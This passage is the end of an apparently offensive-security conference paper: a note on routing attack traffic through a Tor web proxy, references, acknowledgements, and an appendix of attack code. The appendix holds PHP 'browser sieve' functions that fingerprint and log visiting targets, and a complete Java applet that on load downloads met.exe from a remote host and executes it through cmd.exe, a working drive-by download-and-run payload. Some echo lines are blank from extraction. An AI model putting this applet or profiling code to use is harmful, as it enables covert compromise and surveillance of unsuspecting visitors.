The traffic looks very similar to the following example going to Slashdot:
http://tor­proxy.net/proxy/tor/browse.php?u=http%3A%2F%2Fslashdot.org
%2F&b=14
Once combined with everything above, it is possible to have a stable constant anonymous 
connection to any target. 
Page 21 of 26
References
http://www.metasploit.com
http://www.reglos.de/myaddress/MyAddress.html
http://blog.metasploit.com/2006/09/metasploit­30­automated­exploitation.html
https://blackhat.com/presentations/bh­dc­09/ValSmith/BlackHat­DC­09­valsmith­colin­
Dissecting­Web­Attacks.pdf
http://carnal0wnage.blogspot.com/2009/03/pdf­exploits­now­with­heapspray.html
http://blog.didierstevens.com/
http://www.darkoperator.com/
http://ha.ckers.org/
http://www.hackersforcharity.org/ghdb/
http://scriptasylum.com/tutorials/encdec/encode­decode.html
Acknowledgements
Thanks to:
#AR, HD Moore, dragorn, Delchi, Snowchyld, Ed Skoudis, Rezen, knicklighter, 
famousjs, Uninformed, !lso, Dean De Beers, cg, Egypt, tebo, 
Page 22 of 26
Appendix
a.) See http://www.attackresearch.com for Adobe_basic_social_engineering.rb 
b.) Browser sieve functions
function genHeader() {
        echo "";
        echo "";
        echo "";
        echo "";
        echo "";
} // end genHeader
function ipCheck($target_ip) {
        $scopeIPflag = 0;
        if ((preg_match("/$firstRange/",$target_ip, $matches)) ||
        (preg_match("/$sndRange/",$target_ip, $matches))) {
                $scopeIPflag = 1;
        } // end if
        else {
                $scopeIPflag = 0;
        } // end else
        return $scopeIPflag;
} // end ipCheck
function javaCheck() {
        echo "";
} // end javaCheck
function osDetect($useragent) {
        // Check for windows, and send to windows page
        if (preg_match("/Windows/", $useragent,$winmatched)) {
                $ostype = "win";
        } // end windows check
        // Check for linux, and send to linux page
        elseif (preg_match("/Linux/", $useragent,$linmatched)) {
                $ostype = "linux";
        } // end linux check
        // Check for mac, and send to mac page
        elseif (preg_match("/Macintosh/", $useragent,$macmatched)) {
                $ostype = "mac";
        } // end mac
        else {
                $ostype = "unknown";
        } // end else
        return $ostype;
} // end osDetect
Page 23 of 26
function browserDetect($useragent) {
        // Check for firefox
        if (preg_match("/Firefox/", $useragent,$winmatched)) {
                $browsertype = "ff";
        } // end ff check
        // Check for IE
        elseif (preg_match("/MSIE/", $useragent,$winmatched)) {
                $browsertype = "ie";
        } // end ie check
        // Check for safari
        elseif (preg_match("/Safari/", $useragent,$winmatched)) {
                $browsertype = "safari";
        } // end safari check
// Check for opera
        elseif (preg_match("/Opera/", $useragent,$winmatched)) {
                $browsertype = "opera";
        } // end opera check
        // Browser Unknown
        else {
                $browsertype = "unknown";
        } // end unknown check
        return $browsertype;
} // end browserDetect
function jsDecloakIP() {
echo '';
echo '';
} // end jsDecloakIP
function japdip() {
echo '';
echo '';
echo '';
echo '';
} // japdip
Check out: http://www.reglos.de/myaddress/MyAddress.html for info about the class file.
function logger($target_ip,$dip,$ost,$bt,$sipf,$hitdate) {
        $nl = "\n";
        $delim = "|";
Page 24 of 26
        $data = $target_ip . $delim . $dip . 
   $delim . $ost . $delim .  $bt . $delim . $sipf . $delim . $hitdate . $nl;
        $outFile = "clientlog.txt";
        $fh = fopen($outFile, 'a') or die ("cant open logfile");
        fwrite($fh,$data);
        fclose($fh);
} // end logger
c.) Download and run Java Applet
import java.applet.Applet;
import java.io.*;
import java.net.*;
import java.io.IOException;
public class WebDispApp extends Applet {
public WebDispApp()  { }
public void init() { downloadURL(); cmd();
} /* end public void init */
public void downloadURL() {
OutputStream out = null;
URLConnection conn = null;
InputStream  in = null;
try {
     URL url = new URL("http://192.168.1.1/data/win/met.exe");
     out = new BufferedOutputStream(
     new FileOutputStream("c:\\met.exe"));
     conn = url.openConnection();
     in = conn.getInputStream();
     byte[] buffer = new byte[1024];
     int numRead;
     long numWritten = 0;
     while ((numRead = in.read(buffer)) != ­1) {
            out.write(buffer, 0, numRead);
            numWritten += numRead;
     } /* end while */
} /* end try */
catch (Exception exception) {
          exception.printStackTrace();
} /* end catch */
finally {
          try {
                    if (in != null) {
                             in.close();
                     } /* end if */
                    if (out != null) {
                            out.close();
                    } /* end if */
           } /* end try */
           catch (IOException ioe) { }
} /* end finally */
} /* end public void downloadURL */
public void cmd() {
Page 25 of 26
            Process process;
            try  {
                       process = Runtime.getRuntime().exec("cmd.exe /c c:\\met.exe");
            } /* end try */
           catch(IOException ioexception) { }
} /* end public void cmd */
} /* end public class */
Page 26 of 26